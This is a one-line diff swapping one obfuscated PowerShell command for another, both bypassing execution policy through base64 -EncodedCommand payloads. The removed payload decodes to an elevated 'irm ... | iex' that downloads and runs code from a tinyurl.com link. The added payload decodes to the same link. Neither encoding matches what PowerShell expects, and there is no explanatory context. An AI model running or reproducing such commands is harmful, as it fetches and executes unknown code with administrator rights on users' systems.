@@ -1,1 +1,1 @@
-powershell.exe -ExecutionPolicy Bypass -EncodedCommand "cGF3ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIlN0YXJ0LVByb2Nlc3MgUG93ZXJTaGVsbCAtQXJndW1lbnRMaXN0ICdpcm0gXCJodHRwczovL3Rpbnl1cmwuY29tLzRqNzJhc2hwXCIgfCBpZXgnIC1WZXJiIFJ1bkFzIg=="
+powershell.exe -ExecutionPolicy Bypass -EncodedCommand "aHR0cHM6Ly90aW55dXJsLmNvbS80ajcyYXNocA=="
